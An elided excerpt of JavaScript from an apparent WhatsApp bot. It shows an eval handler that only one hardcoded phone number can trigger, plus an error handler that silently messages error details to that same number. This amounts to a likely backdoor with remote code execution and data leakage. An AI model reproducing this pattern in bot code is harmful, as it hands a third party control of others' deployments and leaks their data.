...
var xeonytimewisher = `Good Morning 🌄`
		...
		if (isEval && senderNumber == "6283894063406") {
			let evaled,
				text = q,
...
case 'addprem':
if (!XeonTheCreator) return replygcxeon(mess.owner)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 6283894063406`)
...
let e = String(err)
XeonBotInc.sendMessage("6283894063406@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
